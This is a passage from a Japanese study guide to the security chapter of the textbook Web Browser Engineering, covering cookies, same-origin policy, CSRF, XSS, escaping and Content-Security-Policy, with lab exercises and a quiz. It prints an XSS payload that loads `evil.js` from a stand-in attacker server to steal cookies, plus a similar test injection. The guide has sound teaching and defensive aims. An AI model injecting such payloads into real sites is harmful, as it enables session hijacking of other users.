out += "<i>by " + who + "</i></p>"
```

`entry` はユーザがコメントフォームに入れた任意の内容だ。だから**HTML タグや `<script>` タグを含みうる**。攻撃者は次を投稿する。

```html
Hi! <script src="http://my-server/evil.js"></script>
```

サーバはこれをそのまま出力してしまう。

```html
<p>Hi! <script src="http://my-server/evil.js"></script>
<i>by crashoverride</i></p>
```

結果、**すべてのユーザのブラウザが `evil.js` を実行し、Cookie を攻撃者へ送る**。攻撃者は他ユーザになりすませる。

### 問題の本質

原文は核となる一文を置く（原文）。

> The core problem here is that **user comments are supposed to be data, but the browser is interpreting them as code**. ... misinterpreting data as code is a common security issue in all kinds of programs.

**データであるべきユーザコメントを、ブラウザがコードとして解釈してしまう**。これが **XSS（Cross-Site Scripting、クロスサイトスクリプティング）**。データをコードと誤解するのは、あらゆるプログラムに共通する脆弱性のパターンだ。

〔補足〕原文の脚注は、Cookie を盗む具体手段にも触れている。`document.cookie` API（`https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie`）でサイトの Cookie が読める。本書の限定的なブラウザでは、`evil.js` は**ページ全体を、トークン値を URL に含んだリンクに置き換える**といった素朴な手も使える。「続けるにはクリック」画面を、ユーザは何も考えずクリックする――というわけだ。

### どう守るか（1）― エスケープ

標準的な修正は、**データをコードと解釈できない形にエンコードする**こと（原文）。

> in HTML, you can write `&lt;` to display a less-than sign. Python has an `html` module for this kind of encoding.

```python
import html

def show_comments(session):
    # ...
    out += "<p>" + html.escape(entry) + "\n"
    out += "<i>by " + html.escape(who) + "</i></p>"
    # ...
```

`html.escape` を通すと `<script>` は `&lt;script&gt;` になり、タグとして解釈されず、ただの文字として表示される。

### エスケープだけでは足りない

しかし原文はここで踏みとどまる（原文）。

> if you forget to encode any text anywhere---that's a security bug. So browsers provide additional layers of defense.

**どこか1箇所でもエスケープを忘れたらセキュリティバグ**だ。人間は必ず忘れる。だからブラウザは追加の防御層を用意する。それが CSP だ。

〔補足〕further ボックスは、CSS パーサの寛容さを突く攻撃も挙げる。本書の CSS パーサは非常に緩いので、**一部の HTML ページは有効な CSS としてもパースできる**。これを突いて「外部 HTML ページをスタイルシートとして読み込み、適用されたスタイルを観測する」攻撃や、同様に「外部 JSON ファイルをスクリプトとして読み込む」JSON hijacking がある。`Content-Type` ヘッダを設定すると、ブラウザの **Cross-Origin Read Blocking（CORB）** によってこの種の攻撃を防げる。

---

## 11. Content-Security-Policy ― 追加の防御層

### アイデア

`Content-Security-Policy`（CSP）ヘッダは、最も単純な場合、キーワード `default-src` にサーバのスペース区切りリストを続ける（原文）。

```
Content-Security-Policy: default-src http://example.org
```

効果（原文）:

> This header asks the browser **not to load any resources (including CSS, JavaScript, images, and so on) except from the listed origins**. If our guest book used `Content-Security-Policy`, even if an attacker managed to get a `<script>` added to the page, the browser would refuse to load and run that script.

**CSP とは、列挙したオリジン以外からのリソース読み込みをブラウザに禁止させるヘッダのこと**。たとえ攻撃者が `<script>` の注入に成功しても、許可リスト外のオリジンなら、ブラウザはそれを読み込まず実行しない。エスケープの「忘れ」を後ろで受け止める層になる。

### どう動くか

パースは**JavaScript や CSS を要求する前**に行う必要がある（許可されているか先に確認するため）。

```python
class Tab:
    def load(self, url, payload=None):
        # ...
        self.allowed_origins = None
        if "content-security-policy" in headers:
            csp = headers["content-security-policy"].split()
            if len(csp) > 0 and csp[0] == "default-src":
                self.allowed_origins = []
                for origin in csp[1:]:
                    self.allowed_origins.append(URL(origin).origin())
        # ...
```

スクリプト読み込み時のチェック。相対 URL を先に解決してから判定する点に注意。

```python
class Tab:
    def load(self, url, payload=None):
        # ...
        for script in scripts:
            script_url = url.resolve(script)
            if not self.allowed_request(script_url):
                print("Blocked script", script, "due to CSP")
                continue
            # ...
```

判定関数。

```python
class Tab:
    def allowed_request(self, url):
        return self.allowed_origins == None or \
            url.origin() in self.allowed_origins
```

サーバが CSP を送る。

```python
def handle_connection(conx):
    # ...
    csp = "default-src http://localhost:8000"
    response += "Content-Security-Policy: {}\r\n".format(csp)
    # ...
```

### ブロック時の挙動が2通りある（診断上重要）

原文の脚注（原文）:

> when loading styles and scripts, our browser merely **ignores** blocked resources, while for blocked `XMLHttpRequest`s it **throws an exception**. That's because **exceptions in `XMLHttpRequest` calls can be caught and handled in JavaScript**.

| ブロック対象 | ブラウザの挙動 | 理由 |
| --- | --- | --- |
| スタイル・スクリプト | 単に無視する | ページを止めない |
| `XMLHttpRequest` | 例外を投げる | JavaScript 側で catch して処理できるから |

CSP でブロックされたスクリプトは、コンソールに `Blocked script ... due to CSP` と出る。動作確認では、ゲストブックに許可リスト外のスクリプトを要求させる。

```python
def show_comments(session):
    # ...
    out += "<script src=https://example.com/evil.js></script>"
    # ...
```

### 実ブラウザの CSP はもっと複雑

本書の CSP は最小版だ。実ブラウザでは（原文）:

> In real browsers `Content-Security-Policy` can also list **scheme-generic URLs** and other sources like **`self`**. And there are **keywords other than `default-src`, to restrict styles, scripts, and `XMLHttpRequest`s each to their own set of URLs**.

- scheme を省いた URL や `self` のようなソースも書ける
- `default-src` 以外に、スタイル・スクリプト・XHR をそれぞれ別の URL 集合に制限するキーワードがある

〔補足〕further ボックスは段階的導入の仕組みも挙げる。CSP は複雑なサイトで何かを壊しがちなので、ブラウザは違反を `report-to` ディレクティブでサーバに報告できる。`Content-Security-Policy-Report-Only` ヘッダは、**実際にはブロックせず違反の報告だけ**をさせる。導入時にまず Report-Only で観測する、というのは実務の定石だ。

### 章の結論 ― 「完全に安全」ではない

原文の締め（原文）:

> So are we done? Is the guest book totally secure? Uh ... no. There's more---much, *much* more---to web application security than what's in this book. ... **the guest book is more secure than before**.

**「完全に安全」にはなっていない。** ただ「前より安全」になった。この謙虚さが、診断者の姿勢そのものだ。

---

## 12. まとめの因果連鎖 ― 章末 Summary

原文の Summary（原文）は、この章全体を防御の対応表として言い切っている。

> - mitigating cross-site `XMLHttpRequest`s with **the same-origin policy**;
> - mitigating cross-site request forgery with **nonces** and with **`SameSite` cookies**;
> - mitigating cross-site scripting with **escaping** and with **`Content-Security-Policy`**.

そして本書全体を貫く一般原理（原文）:

> **every increase in the capabilities of a web browser also leads to an increase in its responsibility to safeguard user data.** Security is an ever-present consideration throughout the design of a web browser.

**ブラウザの能力が増えるたびに、ユーザデータを守る責任も増える。** これが本書の背骨だ。診断対象を見るとき、「このアプリは最近どんな機能（能力）を足したか？」と問えば、そこに新しい攻撃面がある可能性が高い。

| 攻撃 | 何を悪用するか | 防御（本書の範囲） |
| --- | --- | --- |
| クロスサイト `XMLHttpRequest` | XHR が Cookie 付きで他サイトを読める | 同一オリジンポリシー |
| CSRF | フォーム送信が SOP の対象外 | nonce（サーバ側）＋ SameSite Cookie（ブラウザ側・多層防御） |
| XSS | データがコードとして解釈される | エスケープ ＋ CSP（追加層） |

〔補足〕章末の warning ボックスは改めて釘を刺す。本書の目的はブラウザの内部を教えることで、Web アプリケーションセキュリティを教えることではない。DoS 攻撃やスパム・悪用への対処はまったく別に必要だ。**セキュリティ上重要なコードを書く前に、他の資料を必ず参照せよ。**

---

## 手を動かす

原典の演習は、そのまま診断者の練習課題になる。clone した環境（`git clone https://github.com/browserengineering/book`）を前提に、自分で立てた検証環境で試すこと。

1. **ゲストブックを立てる。** `cd src/` して `python3 server10.py` を実行する。別の端末で `python3 lab10.py http://localhost:8000/` のようにブラウザ側を動かす（実行にはリポジトリの README の依存が要る）。
2. **Cookie の往復を観察する。** ログイン前後で送られる `Cookie` ヘッダ、サーバが返す `Set-Cookie` ヘッダを確認する。トークンが `random.random()` 由来である（53ビット）ことを、コードで裏取りする。
3. **同一オリジンポリシーを体感する。** 別ポート（例: `http://localhost:9000`）で攻撃者役のページを立て、そこから `XMLHttpRequest` でゲストブックを読もうとし、`Cross-origin XHR request not allowed` で止まることを確認する。
4. **CSRF を再現する。** 攻撃者ページに `action="http://localhost:8000/add"` のフォームを置いて submit し、nonce 検証を外した状態では通ること、nonce を有効にすると弾かれることを比べる。
5. **SameSite の効果を見る。** サーバ側の `Set-Cookie` に `; SameSite=Lax` を付け、クロスサイト POST で Cookie が落ちることを確認する。**注意**: 原典サイトのウィジェットはサンドボックスの都合でクロスオリジンを作れないため、この確認は**ローカルで別ポートの攻撃者役を自分で立てて**行う必要がある。
6. **XSS と CSP を試す。** `html.escape` を外した状態でコメントに `<script>` を入れて実行されることを見たあと、エスケープを戻す。さらにサーバに `Content-Security-Policy: default-src http://localhost:8000` を送らせ、`example.com` のスクリプトが `Blocked script ... due to CSP` になることをコンソールで確認する。
7. **章末演習に挑む。** 特に **10-3**（`document.cookie` と `HttpOnly` の実装）、**10-5**（CORS: `Origin` ヘッダと `Access-Control-Allow-Origin` の往復）、**10-6**（`Referer` と `Referrer-Policy` の `no-referrer` / `same-origin`）は、実 Web の挙動理解に直結する。

---

## つまずきポイント

- **「Cookie のサイト」と「オリジン」を同じだと思い込む。** Cookie は scheme も port も見ない（host だけ）。SOP は scheme + host + port を見る。この非対称が、Cookie 共有バグの温床。
- **SOP がすべてのリクエストに効くと誤解する。** `<script src>` や `<link>` の CSS・JS は SOP の対象外。CDN が使えるのはこのため。だから「SOP があるから安全」は成り立たない。
- **CSRF を「SOP で防げる」と誤解する。** フォーム送信・リンククリックには SOP が効かない。だから nonce や SameSite が別に要る。
- **SameSite の挙動がどのブラウザでも同じだと思う。** デフォルト値（Chrome は Lax、Firefox/Safari は違う）、schemeful same-site、サブドメインの扱いがブラウザで異なる。検証したブラウザを必ず記録する。
- **エスケープすれば XSS は完全に防げると考える。** 1箇所忘れれば穴が開く。だから CSP という追加層がある。逆に CSP があってもエスケープを怠ってよいわけではない。
- **本書のブラウザを「安全な実装の手本」と受け取る。** 著者自身が「悪意ある入力に堅牢ではない」と明言している。乱数は53ビット、複数 `Set-Cookie` 非対応、SameSite は host 完全一致のみ、など簡略化が多い。**骨格を学ぶ教材**として読む。
- **nonce を入れたら SameSite は不要（またはその逆）と考える。** 原文は明確に両方残せと言う。古いブラウザと複数ドメイン対応のため。これが多層防御。

---

## この節のまとめ

- *Web Browser Engineering* は、数千行の Python で実ブラウザを一から作り「謎をコードに置き換える」教材で、第10章がクライアントサイド防御の中心。
- 教材ブラウザは**悪意ある入力に堅牢ではない**と著者が明言する一方、**アーキテクチャは実ブラウザと一致**し、因果の骨格を学べる。
- Cookie とは「サーバが発行したブラウザの分散的な身元」で、`Set-Cookie`（サーバ→ブラウザ）と `Cookie`（ブラウザ→サーバ）の往復で動く。2回目以降は自動で載る。
- セッショントークンは**暗号学的に安全な乱数（256ビット目安）**で作らねばならない。`random.random()` の53ビットは観測から予測され乗っ取りにつながる。
- 認証の結果（`user`）は**サーバ側**に置き、Cookie の中身は信用しない。Cookie はユーザが書き換えられるから。
- パスワード比較は**定数時間**で行う。左から比較して差異で止まる `==` はタイミングサイドチャネルになる。
- cookie jar は**グローバル（タブ非依存）**で、**サブリソース取得にも Cookie が載り**、キーは **host のみ**（scheme も port も含まない）。
- `XMLHttpRequest` は Cookie 付きで他サイトを読めるため、追加した瞬間に**同一オリジンポリシー**（scheme + host + port の一致）が必要になった。
- SOP は**すべてのリクエストには効かない**（CSS/JS のリンクは対象外、iframe/画像/localStorage は対象）。
- フォーム送信・リンククリックは SOP の対象外で、これが **CSRF** を生む。ブラウザは同じサーバへのリクエストに Cookie を自動付与するから成立する。
- CSRF 対策は**サーバ側の nonce**（ユーザに紐づけ、XSS で盗まれうる）と、**ブラウザ側の SameSite Cookie**（多層防御・フェイルセーフ）の2段構え。
- `SameSite=Lax` はクロスサイト POST で Cookie を落とす。だが**デフォルト値・schemeful same-site・サブドメインの扱いはブラウザで異なる**ため、検証ブラウザの記録が必須。
- **XSS の本質は「データであるべきものがコードとして解釈される」こと**。対策は**エスケープ**（基本）と **CSP**（追加層）。エスケープは1箇所の忘れが穴になるので CSP で受ける。
- CSP は「列挙オリジン以外のリソースを読ませない」ヘッダ。ブロック時、スタイル/スクリプトは**無視**、XHR は**例外**（catch できるから）。
- 一貫する原理は「**能力が増えるたびに、データを守る責任が増える**」。診断では「最近増えた機能」に新しい攻撃面を探す。

---

## 理解度チェック

1. オリジンは何によって決まるか。また Cookie の「サイト」と何が違うか。
   ▶ 答え: オリジンは `scheme + host + port` の3つ組。Cookie の「サイト」は **scheme も port も見ず host（ホスト名）だけ**を見る。この非対称のため、http/https 間や異なるポート間で Cookie が意図せず共有されうる。

2. なぜセッショントークンを `random.random()` で作ってはいけないのか。
   ▶ 答え: `random.random()` は53ビットしかランダム性がなく（目安は256ビット）、暗号学的に安全でない。十分な数のトークンを観測すれば将来値を予測でき、アカウント乗っ取りに使われる。暗号学的に安全な乱数生成器（CSPRNG）を使う必要がある。

3. 同一オリジンポリシーがあるのに CSRF が成立するのはなぜか。
   ▶ 答え: SOP は `XMLHttpRequest` などには効くが、**リンクのクリックやフォーム送信という普通のブラウザ操作には効かない**。ブラウザは同じサーバへのリクエストに Cookie を自動付与するので、攻撃者サイトのフォームを submit させれば被害者の Cookie 付きリクエストが飛ぶ。

4. nonce と SameSite Cookie は、CSRF 対策としてそれぞれどちら側の防御か。片方だけで十分か。
   ▶ 答え: nonce は**サーバ側**、SameSite は**ブラウザ側**の防御。原文は両方残せと言う。SameSite は多層防御（フェイルセーフ）だが、古いブラウザや複数ドメインのケースでは nonce が要る。片方だけでは不十分。

5. `SameSite=Lax` は、クロスサイトの GET と POST をそれぞれどう扱うか。
   ▶ 答え: クロスサイト **GET（リンククリック）では Cookie を送る**が、クロスサイト **POST では Cookie を送らない**。CSRF の主経路であるクロスサイト POST を塞ぐのが狙い。

6. XSS の「核心の問題」を一文で言うと何か。
   ▶ 答え: **データであるべきユーザ入力を、ブラウザがコードとして解釈してしまうこと**。データをコードと誤解するのは、あらゆるプログラムに共通する脆弱性パターン。

7. エスケープをきちんとしていれば CSP は不要か。
   ▶ 答え: 不要ではない。エスケープはどこか1箇所忘れただけで穴が開く。CSP は「列挙オリジン以外のリソースを読み込ませない」追加の防御層として、その忘れを後ろで受け止める。逆に CSP があってもエスケープは必要。

8. CSP がリソースをブロックするとき、スタイル/スクリプトと `XMLHttpRequest` で挙動が違う。どう違い、なぜか。
   ▶ 答え: スタイル・スクリプトは**単に無視**、`XMLHttpRequest` は**例外を投げる**。XHR は JavaScript 側で例外を catch して処理できるから、例外にする意味がある。

9. 本書のブラウザを「安全な実装の手本」として使ってよいか。根拠とともに答えよ。
   ▶ 答え: 使ってはいけない。著者自身が「悪意ある入力に堅牢ではない」と明言し、乱数53ビット・複数 `Set-Cookie` 非対応・SameSite は host 完全一致のみ、など簡略化が多い。学ぶべきは実装そのものではなく、**機能追加が防御を要求する因果の骨格**。

10. この章を貫く一般原理は何か。診断にどう活かせるか。
    ▶ 答え: 「ブラウザの能力が増えるたびに、ユーザデータを守る責任も増える」。診断では「対象アプリが最近どんな機能（能力）を足したか」を問い、そこに生まれた新しい攻撃面を探す指針になる。

---

## 出典

- 第10章 Keeping Data Private（`book/security.md` = https://browser.engineering/security.html）
- https://browser.engineering/ （目次・書籍情報。`book/index.md`）
- Preface（https://browser.engineering/preface.html = `book/preface.md`）
- Introduction "Browsers and the Web"（https://browser.engineering/intro.html = `book/intro.md`）
- 公式ソースリポジトリ https://github.com/browserengineering/book （commit c8c6d34b636a0fec3589a4a2e901916c774f1929）
- 日本語版（オライリー・ジャパン）https://www.oreilly.co.jp/books/9784814401574/
- Same-origin policy（MDN）https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
- SameSite（MDN）https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite
- document.cookie（MDN）https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie
- CORS（MDN）https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
- Clickjacking（OWASP）https://owasp.org/www-community/attacks/Clickjacking
- Timing attack（Wikipedia）https://en.wikipedia.org/wiki/Timing_attack

<!-- sources: https://browser.engineering/security.html, https://browser.engineering/, https://browser.engineering/preface.html, https://browser.engineering/intro.html, https://github.com/browserengineering/book, https://www.oreilly.co.jp/books/9784814401574/, https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy, https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite, https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie, https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS, https://owasp.org/www-community/attacks/Clickjacking -->
<!-- terms: Cookie, Set-Cookieヘッダ, Cookieヘッダ, オリジン, 同一オリジンポリシー, cookie jar, XMLHttpRequest, CSRF, nonce, SameSite Cookie, schemeful same-site, XSS, エスケープ, Content-Security-Policy, default-src, タイミングサイドチャネル, 定数時間比較, ブラウザフィンガープリンティング, クリックジャッキング, CORS, HttpOnly, CSPRNG, 多層防御, forbidden header name, Cross-Origin Read Blocking -->
<!-- self-read: https://browser.engineering/security.html | サイト側のegress制限で403拒否。原稿ソースは取得できたがレンダリング済みページ・図・ウィジェットは要現地確認 -->
<!-- self-read: https://browser.engineering/security.html | アニメーションGIF(security-cookies-2.gif, security-spa-2.gif)の動きはソースから確定できず要現地確認 -->
